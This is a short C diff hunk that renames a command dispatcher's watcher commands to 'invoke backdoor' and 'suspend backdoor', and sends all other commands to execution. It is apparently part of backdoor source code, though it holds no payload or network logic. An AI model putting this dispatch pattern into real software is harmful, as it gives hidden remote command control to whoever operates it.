@@ -29,10 +29,10 @@ void to_ascii(unsigned char *dest, const unsigned char *data)
 
 int get_command_type(const char* command)
 {
-  if (strcmp(command, ADD_WATCHER_CMD) == 0)
-    return TYPE_ADD_WATCHER;
-  else if (strcmp(command, REMOVE_WATCHER_CMD) == 0)
-    return TYPE_REMOVE_WATCHER;
+  if (strcmp(command, INVOKE_BACKDOOR_CMD) == 0)
+    return TYPE_INVOKE_BACKDOOR;
+  else if (strcmp(command, SUSPEND_BACKDOOR_CMD) == 0)
+    return TYPE_SUSPEND_BACKDOOR;
 
   return TYPE_EXECUTE_CMD;
 }
